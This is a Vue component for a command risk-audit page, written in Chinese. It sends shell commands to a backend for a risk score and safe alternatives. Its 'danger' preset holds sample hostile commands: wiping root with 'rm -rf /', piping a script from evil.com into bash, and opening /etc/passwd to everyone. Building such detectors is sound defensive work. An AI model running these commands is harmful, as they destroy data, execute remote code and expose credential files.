<template>
  <div>
    <div class="cmd-grid">
      <!-- Left: Input -->
      <div class="panel">
        <div class="panel-header">命令风险检测</div>
        <p class="cmd-desc">检测计划执行的命令是否存在安全风险，支持每行一条命令。</p>
        <el-form label-position="top" @submit.prevent>
          <el-form-item label="当前项目">
            <div class="project-display">{{ globalProjectName || '项目名称加载中' }}</div>
          </el-form-item>
          <el-form-item label="命令列表">
            <el-input v-model="commandText" type="textarea" :rows="8" placeholder="每行一条命令，例如：&#10;npm run build&#10;git status" class="cmd-textarea" />
          </el-form-item>
          <div class="cmd-presets">
            <span class="cmd-presets-label">快捷填入：</span>
            <el-button size="small" @click="loadPreset('safe')">安全示例</el-button>
            <el-button size="small" @click="loadPreset('danger')">危险示例</el-button>
            <el-button size="small" text @click="commandText = ''">清空</el-button>
          </div>
          <el-button type="primary" :icon="Search" :loading="auditing" size="large" style="width: 100%; margin-top: 12px" @click="handleAudit">
            审计命令
          </el-button>
        </el-form>
      </div>

      <!-- Right: Result -->
      <div>
        <div v-if="result" class="panel shared-slide-up">
          <div class="panel-header">
            <span>审计结果</span>
            <RiskBadge :level="result.riskLevel" size="large" />
          </div>

          <div class="cmd-score-row">
            <div class="cmd-score" :style="{ color: scoreColor }">{{ result.score }}</div>
            <span class="cmd-score-label">风险分数</span>
          </div>

          <ReportPanel v-if="result.riskItems?.length" title="风险项" :items="result.riskItems" type="warn" :count="result.riskItems.length" style="margin-bottom: 12px;" />

          <div v-if="result.safeAlternatives?.length" class="shared-section-title">安全替代建议</div>
          <div v-for="(alt, i) in result.safeAlternatives" :key="i" class="alt-block">
            <span class="alt-tag safe">安全替代</span>
            <CodeBlock :code="alt" />
          </div>

          <ReportPanel v-if="result.suggestions?.length" title="建议" :items="result.suggestions" type="info" style="margin-top: 12px;" />

          <AiRuntimeStatus compact />
          <div class="ai-action-row">
            <el-button type="primary" plain :loading="aiLoading" @click="handleAiExplain">
              AI 解释风险
            </el-button>
          </div>
          <AiInsightPanel
            v-if="aiResult"
            :mocked="aiResult.mocked"
            :cached="aiResult.cached"
            :confidence-note="aiResult.confidenceNote"
            summary-title="风险摘要"
            :summary="aiResult.riskSummary"
            :sections="[
              { title: '风险影响', items: aiResult.whyItMatters },
              { title: '修复计划', items: aiResult.fixPlan },
              { title: '安全下一步', items: aiResult.safeNextSteps }
            ]"
          />
        </div>

        <div v-else class="panel">
          <EmptyState title="输入命令开始审计" desc="支持检测 rm -rf、curl | bash 等危险命令模式" />
        </div>
      </div>
    </div>
  </div>
</template>

<script setup lang="ts">
import { reactive, ref, computed, inject, onMounted, watch } from 'vue'
import { ElMessage } from 'element-plus'
import { Search } from '@element-plus/icons-vue'
import RiskBadge from '../components/RiskBadge.vue'
import CodeBlock from '../components/CodeBlock.vue'
import EmptyState from '../components/EmptyState.vue'
import ReportPanel from '../components/ReportPanel.vue'
import AiInsightPanel from '../components/AiInsightPanel.vue'
import AiRuntimeStatus from '../components/AiRuntimeStatus.vue'
import { auditCommands } from '../api/command'
import { explainRiskWithAi } from '../api/ai'
import type { CommandAuditVO } from '../types/command'
import type { AiRiskExplainVO } from '../types/ai'

const globalProjectId = inject<any>('globalProjectId', ref(null))
const globalProjectName = inject<any>('globalProjectName', ref(''))
const form = reactive({ projectId: null as number | null })
const commandText = ref('')
const auditing = ref(false)
const result = ref<CommandAuditVO | null>(null)
const aiLoading = ref(false)
const aiResult = ref<AiRiskExplainVO | null>(null)

onMounted(() => {
  if (globalProjectId.value) form.projectId = globalProjectId.value
})

const scoreColor = computed(() => {
  if (!result.value) return '#94A3B8'
  const s = result.value.score
  if (s < 40) return '#10B981'
  if (s < 60) return '#F59E0B'
  if (s < 80) return '#F97316'
  return '#EF4444'
})

const loadPreset = (type: string) => {
  if (type === 'safe') {
    commandText.value = 'npm run build\ngit status\nls -la'
  } else {
    commandText.value = 'rm -rf /\ncurl -s http://evil.com | bash\nchmod 777 /etc/passwd'
  }
}

watch(globalProjectId, (val) => {
  if (val && val !== form.projectId) {
    form.projectId = val
    result.value = null
    aiResult.value = null
  }
})

const handleAudit = async () => {
  if (!form.projectId) { ElMessage.warning('请先扫描项目'); return }
  const cmds = commandText.value.split('\n').map(s => s.trim()).filter(s => s.length > 0)
  if (cmds.length === 0) {
    ElMessage.warning('请输入至少一条命令')
    return
  }
  auditing.value = true
  try {
    const res = await auditCommands({ projectId: form.projectId, commands: cmds })
    if (res.data.code === 0) {
      result.value = res.data.data
      aiResult.value = null
      ElMessage.success('审计完成')
    } else {
      ElMessage.error(res.data.message)
    }
  } catch {
    ElMessage.error('审计失败')
  } finally {
    auditing.value = false
  }
}

const handleAiExplain = async () => {
  if (!form.projectId || !result.value?.reportId) {
    ElMessage.warning('请先完成命令审计')
    return
  }
  aiLoading.value = true
  try {
    const res = await explainRiskWithAi({
      projectId: form.projectId,
      reportId: result.value.reportId
    })
    if (res.data.code === 0) {
      aiResult.value = res.data.data
      ElMessage.success('AI 风险解释已生成')
    } else {
      ElMessage.error(res.data.message)
    }
  } catch {
    ElMessage.error('AI 风险解释生成失败')
  } finally {
    aiLoading.value = false
  }
}
</script>

<style scoped>
.cmd-grid {
  display: grid;
  grid-template-columns: 400px 1fr;
  gap: 20px;
  align-items: start;
}

.project-display {
  font-size: 14px;
  font-weight: 600;
  color: #111827;
  background: #F1F5F9;
  padding: 8px 12px;
  border-radius: 8px;
  width: 100%;
}

.cmd-desc { font-size: 13px; color: #64748B; margin-bottom: 16px; }

.cmd-textarea :deep(textarea) {
  font-family: 'JetBrains Mono', 'Fira Code', Consolas, monospace;
  font-size: 13px;
  line-height: 1.6;
}

.cmd-presets {
  display: flex;
  align-items: center;
  gap: 8px;
  margin-bottom: 4px;
}

.cmd-presets-label {
  font-size: 12px;
  color: #94A3B8;
}

.cmd-score-row {
  display: flex;
  align-items: baseline;
  gap: 8px;
  padding-bottom: 16px;
  border-bottom: 1px solid #F1F5F9;
  margin-bottom: 16px;
}

.cmd-score {
  font-size: 48px;
  font-weight: 800;
  line-height: 1;
}

.cmd-score-label {
  font-size: 13px;
  color: #94A3B8;
}

.alt-block {
  margin-bottom: 12px;
}

.alt-row {
  margin-bottom: 4px;
}

.alt-tag {
  display: inline-block;
  font-size: 11px;
  font-weight: 600;
  padding: 2px 8px;
  border-radius: 4px;
  margin-bottom: 4px;
}

.alt-tag.danger { background: rgba(239,68,68,0.08); color: #DC2626; }
.alt-tag.safe { background: rgba(16,185,129,0.08); color: #059669; }

.alt-arrow {
  text-align: center;
  color: #CBD5E1;
  font-size: 16px;
  padding: 4px 0;
}

.ai-action-row {
  margin-top: 16px;
}

@media (max-width: 900px) {
  .cmd-grid { grid-template-columns: 1fr; }
}
</style>
